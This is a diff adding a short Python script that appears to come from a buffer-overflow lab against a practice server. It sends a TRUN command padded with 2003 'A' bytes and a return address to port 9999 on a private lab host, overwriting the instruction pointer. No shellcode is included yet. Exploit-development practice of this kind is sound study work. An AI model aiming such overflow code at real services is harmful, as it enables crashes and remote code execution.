@@ -1,0 +1,17 @@
+import sys
+import socket
+from time import sleep
+
+ret = "\xaf\x11\x50\x62"
+junk = "A" * 2003
+code = "\xef\xbe\xad\xde"
+try:
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('10.10.167.211',9999))
+
+    s.send("TRUN /.:/" + junk + ret)
+    s.close();
+except:
+    #print("the buffer flown at %s", str(len(buffer)))
+    sys.exit()
+         
